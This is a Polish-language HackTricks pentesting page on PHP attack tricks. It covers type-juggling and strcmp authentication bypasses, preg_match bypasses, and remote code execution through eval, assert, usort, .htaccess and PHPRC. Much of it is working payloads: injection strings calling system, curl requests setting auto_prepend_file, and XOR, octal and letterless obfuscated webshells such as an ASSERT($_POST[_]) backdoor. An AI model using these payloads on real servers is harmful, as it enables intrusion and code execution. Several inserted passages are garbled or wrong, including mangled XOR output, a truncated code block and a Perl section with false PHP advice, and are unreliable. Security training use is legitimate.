# Sztuczki w PHP

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>

## Wsp贸lne lokalizacje plik贸w cookie:

To r贸wnie偶 dotyczy plik贸w cookie phpMyAdmin.

Pliki cookie:
```
PHPSESSID
phpMyAdmin
```
Lokacje:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Omijanie por贸wna w PHP

### Lu藕ne por贸wnania / Type Juggling ( == )

Jeli w PHP u偶ywane jest `==`, istniej przypadki, w kt贸rych por贸wnanie nie zachowuje si tak, jak oczekiwano. Wynika to z faktu, 偶e "==" por贸wnuje tylko wartoci przeksztacone do tego samego typu. Jeli chcesz r贸wnie偶 por贸wna, czy typ danych jest taki sam, musisz u偶y `===`.

Tabele por贸wna w PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` - Cig znak贸w, kt贸ry nie zaczyna si od liczby, jest r贸wny liczbie
* `"0xAAAA" == "43690" -> True` - Cigi skadajce si z liczb w formacie dziesitnym lub szesnastkowym mo偶na por贸wnywa z innymi liczbami/cigami, a wynik bdzie r贸wny True, jeli liczby bd takie same (liczby w cigu s interpretowane jako liczby)
* `"0e3264578" == 0 --> True` - Cig znak贸w rozpoczynajcy si od "0e" i po nim dowolne znaki bdzie r贸wny 0
* `"0X3264578" == 0X --> True` - Cig znak贸w rozpoczynajcy si od "0" i po nim dowolna litera (X mo偶e by dowoln liter) i po niej dowolne znaki bdzie r贸wny 0
* `"0e12334" == "0" --> True` - Jest to bardzo interesujce, poniewa偶 w niekt贸rych przypadkach mo偶na kontrolowa cig wejciowy "0" i pewn zawarto, kt贸ra jest haszowana i por贸wnywana z nim. Dlatego jeli mo偶esz poda warto, kt贸ra utworzy hasz zaczynajcy si od "0e" i bez 偶adnej litery, mo偶esz omin por贸wnanie. Mo偶esz znale藕 **ju偶 zahaszowane cigi** w tym formacie tutaj: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` - Dowolna litera w cigu jest r贸wna liczbie cakowitej 0

Wicej informacji na stronie [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** r贸wnie偶 wpywa na funkcj `in_array()` domylnie (musisz ustawi trzeci argument na true, aby dokona cisego por贸wnania):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Jeli ta funkcja jest u偶ywana do **jakiejkolwiek weryfikacji uwierzytelniania** (takiej jak sprawdzanie hasa) i u偶ytkownik kontroluje jedn stron por贸wnania, mo偶e wysa pusty tablic zamiast cigu znak贸w jako warto hasa (`https://example.com/login.php/?username=admin&password[]=`) i omin t weryfikacj:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Ten sam bd wystpuje przy u偶yciu `strcasecmp()`.

### Surowe rzutowanie typ贸w

Nawet jeli u偶ywane jest `===`, mog wystpi bdy, kt贸re czyni por贸wnanie podatnym na surowe rzutowanie typ贸w. Na przykad, jeli por贸wnanie konwertuje dane na inny typ obiektu przed por贸wnaniem:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** mo偶e by u偶ywane do **walidacji danych wprowadzanych przez u偶ytkownika** (sprawdza, czy na **wprowadzonych danych u偶ytkownika** znajduje si **jakiekolwiek sowo/regex** z **czarnej listy**, jeli nie, kod mo偶e kontynuowa swoje wykonanie).

#### Ominicie nowej linii

Jednak, gdy okrelamy pocztek wyra偶enia regularnego `preg_match()`, **sprawdzane jest tylko pierwsze linia danych wprowadzanych przez u偶ytkownika**, wic jeli w jaki spos贸b mo偶esz **przesa** dane wejciowe w **kilku liniach**, mo偶esz omini t kontrol. Przykad:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Aby omin t kontrol, mo偶esz **wysa warto z zakodowanymi znakami nowej linii** (`%0A`) lub jeli mo偶esz wysa **dane JSON**, wylij je w **kilku wierszach**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Przykad mo偶na znale藕 tutaj: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass bdu dugoci**

(Ten bypass zosta przetestowany na PHP 5.2.5 i nie udao mi si go uruchomi na PHP 7.3.15)\
Jeli mo偶esz przesa do `preg_match()` prawidowe, bardzo **du偶e dane wejciowe**, to **nie bdzie w stanie ich przetworzy** i bdziesz m贸g **obej** t kontrol. Na przykad, jeli jest na czarnej licie JSON, mo偶esz przesa:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### Przeamanie ReDoS

Sztuczka z: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

W skr贸cie problem wystpuje, poniewa偶 funkcje `preg_*` w PHP opieraj si na bibliotece [PCRE](http://www.pcre.org/). W PCRE niekt贸re wyra偶enia regularne s dopasowywane za pomoc wielu rekurencyjnych wywoa, co zu偶ywa du偶o miejsca na stosie. Mo偶na ustawi limit na ilo rekursji, ale w PHP ten limit [domylnie wynosi 100 000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), co przekracza rozmiar stosu.

[Wtek na Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) r贸wnie偶 zosta podlinkowany w pocie, gdzie bardziej szczeg贸owo om贸wiono ten problem. Nasze zadanie byo jasne:\
**Wysa dane wejciowe, kt贸re spowoduj, 偶e wyra偶enie regularne wykona ponad 100 000 rekursji, powodujc SIGSEGV, co spowoduje, 偶e funkcja `preg_match()` zwr贸ci `false`, a aplikacja uzna, 偶e nasze dane wejciowe nie s zoliwe, rzucajc niespodziank na kocu adunku, na przykad `{system(<bardzozaakomend>)}` aby uzyska SSTI --> RCE --> flaga :)**.

No c贸偶, w terminach wyra偶e regularnych, tak naprawd nie wykonujemy 100 tysicy "rekursji", ale zamiast tego liczymy "kroki cofania", kt贸re, jak [dokumentacja PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) m贸wi, domylnie wynosz 1 000 000 (1M) w zmiennej `pcre.backtrack_limit`.\
Aby to osign, `'X'*500_001` spowoduje wykonanie 1 miliona krok贸w cofania (500 tysicy do przodu i 500 tysicy do tyu):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling dla obfuskacji w PHP

Type Juggling (konwersja typ贸w) jest technik, kt贸ra mo偶e by wykorzystana do obfuskacji kodu w PHP. Polega ona na manipulacji typami danych w celu ukrycia prawdziwego znaczenia kodu. 

W PHP, konwersja typ贸w mo偶e by wykonywana automatycznie przez interpreter, co mo偶e prowadzi do nieoczekiwanych rezultat贸w. Mo偶emy wykorzysta t cech do zaciemnienia kodu i utrudnienia jego analizy.

Przykadem jest por贸wnanie dw贸ch zmiennych r贸偶nych typ贸w, kt贸re mog by r贸wne dla interpretera PHP, ale nie dla czowieka. Na przykad:

```php
$var1 = "123";
$var2 = 123;

if ($var1 == $var2) {
    echo "R贸wne";
} else {
    echo "R贸偶ne";
}
```

Interpreter PHP traktuje te dwie zmienne jako r贸wne, poniewa偶 wykonuje konwersj typ贸w. Jednak dla czowieka jest to oczywicie r贸偶nica midzy cigiem znak贸w a liczb.

Mo偶emy wykorzysta t cech do ukrycia prawdziwych wartoci zmiennych lub warunk贸w logicznych w kodzie. Na przykad, mo偶emy u偶y konwersji typ贸w do ukrycia cigu znak贸w reprezentujcego haso:

```php
$password = "5eba61e4c9b93f3f0682250b6cf8331b7ee68fd8"; // Hash hasa

if ($password == $_GET['password']) {
    echo "Dostp przyznany";
} else {
    echo "Dostp zabroniony";
}
```

W tym przypadku, jeli podamy cig znak贸w jako parametr `password` w adresie URL, interpreter PHP automatycznie przekonwertuje go na liczb i por贸wna z haszem hasa. Mo偶emy wykorzysta t cech do pr贸by odgadnicia prawdziwego hasa.

Type Juggling jest jedn z wielu technik, kt贸re mog by wykorzystane do obfuskacji kodu w PHP. Wa偶ne jest, aby by wiadomym tych technik i zabezpieczy kod przed potencjalnymi atakami.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Wykonaj po przekierowaniu (EAR)

Jeli PHP przekierowuje na inn stron, ale nie jest wywoywana 偶adna funkcja **`die`** lub **`exit`** **po ustawieniu nag贸wka `Location`**, PHP kontynuuje wykonywanie i docza dane do ciaa:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Wicej sztuczek

* **register\_globals**: W **PHP < 4.1.1.1** lub jeli jest 藕le skonfigurowany, **register\_globals** mo偶e by aktywny (lub ich zachowanie jest naladowane). Oznacza to, 偶e w zmiennych globalnych, takich jak $\_GET, jeli maj warto np. $\_GET\["param"]="1234", mo偶na uzyska do niej dostp za pomoc **$param**. Dlatego, wysyajc parametry HTTP, mo偶na nadpisa zmienne, kt贸re s u偶ywane w kodzie.
* Ciasteczka **PHPSESSION dla tej samej domeny s przechowywane w tym samym miejscu**, dlatego jeli w obrbie domeny **r贸偶ne ciasteczka s u偶ywane w r贸偶nych cie偶kach**, mo偶na sprawi, 偶e jedna cie偶ka **uzyska dostp do ciasteczka z innej cie偶ki**, ustawiajc warto ciasteczka z innej cie偶ki.\
W ten spos贸b, jeli **obie cie偶ki maj dostp do zmiennej o tej samej nazwie**, mo偶na sprawi, 偶e **warto tej zmiennej w cie偶ce 1 zostanie zastosowana do cie偶ki 2**. A nastpnie cie偶ka 2 bdzie uwa偶a zmienne cie偶ki 1 za wa偶ne (nadajc ciasteczku nazw, kt贸ra odpowiada jej w cie偶ce 2).
* Gdy masz **nazwy u偶ytkownik贸w** u偶ytkownik贸w maszyny. Sprawd藕 adres: **/\~\<USERNAME>**, aby sprawdzi, czy katalogi php s aktywowane.
* [**LFI i RCE za pomoc php wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Te funkcje s typowo u偶ywane w PHP do **generowania skr贸t贸w z hasami** i do **sprawdzania**, czy haso jest poprawne w por贸wnaniu ze skr贸tem.\
Obsugiwane algorytmy to: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (zaczyna si od `$2y$`). Nale偶y zauwa偶y, 偶e **PASSWORD\_DEFAULT jest czsto takie samo jak PASSWORD\_BCRYPT**. Obecnie **PASSWORD\_BCRYPT** ma **ograniczenie rozmiaru wejcia do 72 bajt贸w**. Dlatego, gdy pr贸bujesz wygenerowa skr贸t dla czego wikszego ni偶 72 bajty za pomoc tego algorytmu, zostanie u偶ytych tylko pierwszych 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Omijanie nag贸wk贸w HTTP poprzez wykorzystanie bd贸w PHP

Jeli **strona PHP drukuje bdy i wywietla dane wprowadzone przez u偶ytkownika**, u偶ytkownik mo偶e sprawi, 偶e serwer PHP wydrukuje **tre wystarczajco dug**, aby podczas pr贸by **dodania nag贸wk贸w** do odpowiedzi serwera wystpi bd.\
W poni偶szym scenariuszu **atakujcy spowodowa, 偶e serwer wygenerowa du偶e bdy**, i jak wida na zrzucie ekranu, kiedy PHP pr贸bowao **zmodyfikowa informacje nag贸wka, nie udao si to** (na przykad nag贸wek CSP nie zosta wysany do u偶ytkownika):

![](<../../../.gitbook/assets/image (465).png>)

## Wykonanie kodu

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Sprawd藕 to, aby uzyska wicej przydatnych funkcji PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Aby wykona kod w argumencie "replace", wymagane jest co najmniej jedno dopasowanie.\
Ta opcja preg\_replace zostaa **przestarzaa od wersji PHP 5.5.0.**

### **RCE za pomoc Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE poprzez Assert()**

Ta funkcja w PHP umo偶liwia **wykonanie kodu zapisanego w cigu znak贸w** w celu **zwr贸cenia wartoci true lub false** (i w zale偶noci od tego zmieni wykonanie). Zazwyczaj zmienna u偶ytkownika zostanie wstawiona w rodku cigu znak贸w. Na przykad:\
`assert("strpos($_GET['page']),'..') === false")` --> W tym przypadku, aby uzyska **RCE**, mo偶na zrobi:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Bdziesz musia **zama** skadni kodu, **doda** sw贸j **payload**, a nastpnie **naprawi** go ponownie. Mo偶esz u偶y operacji logicznych, takich jak "**and" lub "%26%26" lub "|"**. Zauwa偶, 偶e "or" lub "||" nie dziaaj, poniewa偶 jeli pierwszy warunek jest prawdziwy, nasz payload nie zostanie wykonany. Podobnie nie dziaa ";", poniewa偶 nasz payload nie zostanie wykonany.

**Inn opcj** jest dodanie do cigu wykonania polecenia: `'.highlight_file('.passwd').'`

**Inn opcj** (jeli masz dostp do kodu wewntrznego) jest zmodyfikowanie pewnej zmiennej w celu zmiany wykonania: `$file = "hola"`

### **RCE za pomoc usort()**

Ta funkcja su偶y do sortowania tablicy element贸w za pomoc okrelonej funkcji.\
Aby wykorzysta t funkcj:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Mo偶esz r贸wnie偶 u偶y **//** aby skomentowa reszt kodu.

Aby odkry liczb nawias贸w, kt贸re musisz zamkn:

* `?order=id;}//`: otrzymujemy komunikat o bdzie (`Parse error: syntax error, unexpected ';'`). Prawdopodobnie brakuje nam jednego lub wicej nawias贸w.
* `?order=id);}//`: otrzymujemy **ostrze偶enie**. Wyglda na to, 偶e jest to prawidowe.
* `?order=id));}//`: otrzymujemy komunikat o bdzie (`Parse error: syntax error, unexpected ')' i`). Prawdopodobnie mamy zbyt wiele zamykajcych nawias贸w.

### **RCE za pomoc pliku .httaccess**

Jeli mo偶esz **zaadowa** plik **.htaccess**, mo偶esz **skonfigurowa** wiele rzeczy, a nawet wykona kod (konfigurujc, 偶e pliki o rozszerzeniu .htaccess mog by **wykonywane**).

R贸偶ne powoki .htaccess mo偶na znale藕 [tutaj](https://github.com/wireghoul/htshells)

### RCE za pomoc zmiennych rodowiskowych

Jeli znajdziesz podatno, kt贸ra umo偶liwia **modyfikacj zmiennych rodowiskowych w PHP** (oraz inn do przesyania plik贸w, chocia偶 po dokadniejszych badaniach mo偶e to by obejc), mo偶esz wykorzysta to zachowanie do uzyskania **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Ta zmienna rodowiskowa pozwala na adowanie dowolnych bibliotek podczas wykonywania innych binarnych plik贸w (cho w tym przypadku mo偶e nie dziaa).
* **`PHPRC`** : Wskazuje PHP, **gdzie znajduje si plik konfiguracyjny**, zwykle nazywany `php.ini`. Jeli mo偶esz przesa wasny plik konfiguracyjny, u偶yj `PHPRC`, aby wskaza PHP na niego. Dodaj wpis **`auto_prepend_file`**, wskazujcy na drugi przesany plik. Ten drugi plik zawiera normalny **kod PHP, kt贸ry jest nastpnie wykonywany** przez rodowisko wykonawcze PHP przed innym kodem.
1. Przelij plik PHP zawierajcy nasz kod powoki
2. Przelij drugi plik zawierajcy dyrektyw **`auto_prepend_file`**, instruujc preprocesor PHP do wykonania pliku przesanego w kroku 1
3. Ustaw zmienn `PHPRC` na plik przesany w kroku 2.
* Uzyskaj wicej informacji na temat wykonania tego acucha [**z oryginalnego raportu**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - inna opcja
* Jeli **nie mo偶esz przesya plik贸w**, mo偶esz u偶y w FreeBSD pliku "/dev/fd/0", kt贸ry zawiera **`stdin`**, bdcy **treci** 偶dania wysanego do `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Lub aby uzyska RCE, wcz **`allow_url_include`** i dodaj plik z **kodem PHP w formacie base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Technika [**z tego raportu**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Statyczna analiza PHP

Sprawd藕, czy mo偶esz wstawi kod w wywoania tych funkcji (z [tutaj](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Jeli debugujesz aplikacj PHP, mo偶esz globalnie wczy wywietlanie bd贸w w pliku `/etc/php5/apache2/php.ini`, dodajc `display_errors = On`, a nastpnie zrestartowa Apache: `sudo systemctl restart apache2`

### Deobfuskacja kodu PHP

Mo偶esz u偶y strony **www.unphp.net** do deobfuskacji kodu PHP.

## Wrapper-y i protokoy PHP

Wrapper-y i protokoy PHP mog umo偶liwi obejcie zabezpiecze zapisu i odczytu w systemie oraz jego kompromitacj. Aby uzyska wicej informacji, sprawd藕 [t stron](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug RCE bez uwierzytelnienia

Jeli zauwa偶ysz, 偶e **Xdebug** jest **wczony** w wyniku polecenia `phpconfig()`, spr贸buj uzyska zdalne wykonanie kodu za pomoc [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Zmienne zmiennych
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Wykorzystywanie RCE za pomoc $\_GET\["a"]\($\_GET\["b"])

Jeli na stronie mo偶esz **utworzy nowy obiekt dowolnej klasy**, mo偶esz by w stanie uzyska RCE, sprawd藕 nastpujc stron, aby dowiedzie si jak:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Wykonanie PHP bez liter

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### U偶ycie 贸semkowego systemu liczbowego
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) jest operatorem logicznym, kt贸ry wykonuje operacj bitow na dw贸ch operandach. Wynik XOR jest prawdziwy tylko wtedy, gdy jeden z operand贸w jest prawdziwy, a drugi jest faszywy. W kontekcie programowania, XOR jest czsto u偶ywany do szyfrowania i deszyfrowania danych.

W PHP, operator XOR jest reprezentowany przez symbol `^`. Mo偶e by u偶ywany do wykonywania operacji XOR na dw贸ch liczbach lub na dw贸ch cigach znak贸w. Jeli operandy s liczbami, XOR zostanie wykonane na ich binarnych reprezentacjach. Jeli operandy s cigami znak贸w, XOR zostanie wykonane na ich kodach ASCII.

Przykad u偶ycia operatora XOR w PHP:

```php
$number1 = 10;
$number2 = 5;

$result = $number1 ^ $number2;
echo $result; // Output: 15

$string1 = "Hello";
$string2 = "World";

$result = $string1 ^ $string2;
echo $result; // Output: 
```

W powy偶szym przykadzie, wynik operacji XOR dla liczb 10 i 5 wynosi 15. Wynik operacji XOR dla cig贸w znak贸w "Hello" i "World" to cig znak贸w o kodach ASCII .

Operator XOR mo偶e by r贸wnie偶 u偶ywany do prostego szyfrowania i deszyfrowania danych. Na przykad, mo偶emy zaszyfrowa cig znak贸w, wykonujc operacj XOR na jego kodach ASCII i kluczu, a nastpnie odszyfrowa go wykonujc operacj XOR na zaszyfrowanym cigu i tym samym kluczu.

```php
$string = "Secret message";
$key = "Key";

$encrypted = $string ^ $key;
echo $encrypted; // Output: \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If 垄___ not needed then $_($__), show_source(.passwd)
```
### XOR atwy kod powoki

Zgodnie z [**tym opisem**](https://mgp25.com/ctf/Web-challenge/), mo偶na wygenerowa atwy kod powoki w ten spos贸b:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Wic jeli mo偶esz **wykona dowolny kod PHP bez u偶ycia cyfr i liter**, mo偶esz wysa 偶danie, wykorzystujc taki adunek, aby wykona dowolny kod PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Dla bardziej szczeg贸owego wyjanienia sprawd藕 [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### Kod powoki XOR (wewntrz eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl podobny

Perl jest jzykiem programowania, kt贸ry jest czsto wykorzystywany w skryptach CGI (Common Gateway Interface) do tworzenia dynamicznych stron internetowych. Jeli jeste programist, kt贸ry zna Perl, mo偶esz wykorzysta swoj wiedz w celu pisania skrypt贸w PHP w podobny spos贸b.

Oto kilka wskaz贸wek, kt贸re pomog Ci pisa kod PHP w stylu Perl:

#### Zmienne

W Perl, deklaracja zmiennej nie jest wymagana. Mo偶esz po prostu przypisa warto do zmiennej i u偶ywa jej w kodzie. W PHP, zaleca si jednak deklarowanie zmiennych przed ich u偶yciem. Mo偶esz to zrobi za pomoc sowa kluczowego `var` lub `let`.

```php
$zmienna = "Witaj, wiecie!";
echo $zmienna;
```

#### Tablice

W Perl, tablice s dynamiczne i nie musisz okrela ich rozmiaru podczas deklaracji. W PHP, mo偶esz u偶y funkcji `array()` lub skr贸conej skadni `[]` do tworzenia tablic.

```php
@tablica = ("jabko", "banan", "pomaracza");
echo $tablica[0]; // wywietli "jabko"
```

#### Ptle

W Perl, ptla `foreach` jest czsto u偶ywana do iteracji po elementach tablicy. W PHP, mo偶esz u偶y ptli `foreach` lub ptli `for` do tego samego celu.

```php
@tablica = ("jabko", "banan", "pomaracza");
foreach ($tablica as $element) {
    echo $element;
}
```

#### Wyra偶enia regularne

W Perl, wyra偶enia regularne s czsto u偶ywane do manipulacji i przetwarzania tekst贸w. W PHP, mo偶esz u偶y funkcji takich jak `preg_match()` lub `preg_replace()` do pracy z wyra偶eniami regularnymi.

```php
$tekst = "Witaj, wiecie!";
if (preg_match("/wiecie/", $tekst)) {
    echo "Znaleziono dopasowanie!";
}
```

#### Funkcje

W Perl, funkcje s definiowane za pomoc sowa kluczowego `sub`. W PHP, mo偶esz u偶y sowa kluczowego `function` do definiowania funkcji.

```php
function powitanie($imie) {
    echo "Witaj, $imie!";
}

powitanie("Jan"); // wywietli "Witaj, Jan!"
```

Pamitaj, 偶e cho PHP i Perl maj wiele podobiestw, istniej r贸wnie偶 r贸偶nice w skadni i funkcjonalnoci. Wa偶ne jest, aby by wiadomym tych r贸偶nic i dostosowa sw贸j kod odpowiednio.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
